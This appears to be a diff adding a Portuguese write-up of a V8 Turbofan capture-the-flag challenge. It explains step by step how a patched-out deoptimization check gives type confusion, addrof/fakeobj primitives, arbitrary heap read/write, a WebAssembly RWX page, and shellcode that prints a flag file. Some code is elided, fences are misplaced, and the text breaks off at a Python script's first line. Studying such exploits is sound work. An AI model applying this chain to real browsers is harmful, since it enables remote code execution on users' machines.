@@ -1,4 +1,167 @@
 Ja tem um exploit [aqui](https://github.com/nico-abram/d8-turboflan)
+
+Visão geralO exploit usa a vulnerabilidade do LowerCheckMaps para criar primitivos de leitura/escrita arbitrária na heap do V8, depois escreve shellcode numa página RWX criada pelo WebAssembly.
+
+Parte 1 — Utilitários de conversão
+```
+javascriptfunction ftoi(val) { ... }  // float64 -> BigInt (64 bits)
+function itof(val) { ... }  // BigInt -> float64
+function compress_ptr(old_val, low_32bits) { ... }
+// Preserva os 32 bits altos e substitui os 32 bits baixos
+// Necessário porque V8 usa pointer compression (ponteiros de 32 bits)
+
+function compress_elementptr(old_val, low_32bits) { ... }
+// Igual ao compress_ptr mas subtrai 8 bytes
+// Arrays em V8 têm o length armazenado 8 bytes ANTES dos elementos
+```
+
+Parte 2 — fl_read e fl_write (trigger da vulnerabilidade)
+```
+javascriptfunction fl_read(read_arr, idx) {
+    let val = read_arr[idx]
+    let vval = val
+    let x = [1,1,3,4]
+    for(var i=0; i < 3; i++) {
+        let y = x[x[1]]
+        vval += vval ? x[y] : vval;
+    }
+    return read_arr[idx];  // leitura JIT-compilada
+}
+```
+O loop interno com x é ruído proposital para:
+
+Prevenir inlining pelo JIT
+Fazer a função parecer "pesada" para o Turbofan compilar
+
+A função é treinada 1.000.001 vezes com float arrays. Depois quando chamada com object arrays, o JIT não deoptimiza (graças ao patch), então trata os ponteiros de objetos como doubles de 64 bits — type confusion!
+
+Parte 3 — addrof (vazar endereço de qualquer objeto)
+```
+function addrof(obj) {
+    let obj_arr = [obj];
+    return ftoi(fl_read(obj_arr, 0)) & 0xFFFFFFFFn
+}
+```
+fl_read foi treinada com floats, mas recebe obj_arr
+JIT lê o ponteiro de 32 bits do objeto como se fosse um double de 64 bits
+& 0xFFFFFFFFn extrai os 32 bits baixos = endereço comprimido do objeto na heap V8
+
+
+
+Parte 4 — fakeobj (criar objeto falso em endereço arbitrário)
+```
+javascriptfunction fakeobj(addr) {
+    let obj = {"a":1}
+    let obj_arr = [obj, obj]
+    addr = ftoi(addr) & 0xFFFFFFFFn;
+    addr = itof(addr | (addr << 32n))  // duplicar nos 64 bits
+    fl_write(obj_arr, 0, addr)         // escrever float onde JIT espera objeto
+    return obj_arr[0]                  // retornar "objeto" no endereço falso
+}
+```
+
+fl_write foi treinada com floats, então escreve o valor como float nos 64 bits. Mas obj_arr[0] é lido pelo JS como um ponteiro de objeto → aponta para onde quisermos.
+
+Parte 5 — Arbitrary read/write na heap V8
+javascript// Estrutura usada:
+```
+let obj_arr = [obj_a, obj_a, ...]  // 8 objetos
+let fl_arr  = [1.1, 1.2]           // 2 floats
+
+let fl_arr_addr = addrof(fl_arr);
+let fl_arr_elementptr_addr = fl_arr_addr + 8n;
+// +8 porque: [map(4B)][properties(4B)][elementptr(4B)][length(4B)]
+
+// Sobrescrever obj_arr[5] com o endereço do elementptr de fl_arr
+let old_val = fl_read(obj_arr, 5)
+let compressed = compress_elementptr(old_val, fl_arr_elementptr_addr)
+fl_write(obj_arr, 5, compressed)
+// Agora obj_arr[0] aponta para o campo elementptr de fl_arr!
+Com isso:
+javascriptfunction arb_heap_read(addr) {
+    let old = fl_read(obj_arr, 0)
+    let elementptr = compress_elementptr(old, addr & 0xFFFFFFFFn)
+    fl_write(obj_arr, 0, elementptr)  // redirecionar fl_arr para addr
+    return fl_arr[0];                  // ler o valor em addr
+}
+
+function arb_heap_write(addr, val) {
+    let old = fl_read(obj_arr, 0)
+    let elementptr = compress_elementptr(old, addr & 0xFFFFFFFFn)
+    fl_write(obj_arr, 0, elementptr)  // redirecionar fl_arr para addr
+    fl_arr[0] = val;                   // escrever val em addr
+}
+```
+Parte 6 — Página RWX via WebAssembly
+
+```
+javascriptvar module = new WebAssembly.Module(wasm_data);
+var instance = new WebAssembly.Instance(module);
+var exec_machine_code = instance.exports.main;
+Quando V8 compila um módulo Wasm, cria uma página de memória com permissões RWX (read/write/execute) onde coloca o código JIT compilado. O ponteiro para essa página está armazenado dentro do objeto instance na heap.
+javascriptvar wasm_instance_base_addr = addrof(instance) - 1n;
+var rwx_page_ptr_addr = wasm_instance_base_addr + 105n;
+// +105 é o offset fixo do ponteiro RWX dentro do WasmInstance
+var rwx_page_ptr = ftoi(arb_heap_read(rwx_page_ptr_addr));
+```
+
+
+Parte 7 — Redirecionar ArrayBuffer para página RWX
+
+```
+javascriptvar arr_buf = new ArrayBuffer(0x400);
+var dataview = new DataView(arr_buf);
+
+var arr_buf_addr = addrof(arr_buf);
+var arr_buf_backing_store_addr = arr_buf_addr + 20n;
+// +20 = offset do backing store pointer dentro do ArrayBuffer
+
+arb_heap_write(arr_buf_backing_store_addr, itof(rwx_page_ptr));
+// Agora arr_buf aponta para a página RWX!
+```
+
+O DataView sobre arr_buf agora escreve diretamente na página executável.
+
+Parte 8 — Shellcode (open/read/write da flag)
+
+```
+javascriptvar machine_code = [ 0xfa1e0ff3, ... ];
+for (let i = 0; i < machine_code.length; i++) {
+    dataview.setBigUint64(i * 4, BigInt(machine_code[i]), true);
+}
+exec_machine_code();  // executar o shellcode!
+O shellcode faz:
+
+open("./flag.txt", O_RDONLY)
+read(fd, buffer, 0x1400)
+write(1, buffer, bytes_read) → imprime na stdout
+
+
+Fluxo completo resumido
+patch remove DeoptimizeIfNot
+        |
+   type confusion float <-> object array
+        |
+   addrof + fakeobj primitivos
+        |
+   arbitrary read/write na heap V8
+        |
+   leak ponteiro RWX do WasmInstance
+        |
+   redirecionar ArrayBuffer backing store -> RWX page
+        |
+   escrever shellcode via DataView
+        |
+   exec_machine_code() -> flag!
+```
+
+
+
+
+
+
+
+
 ```
 cat script.py                                                                                         ✔ 
 import socket
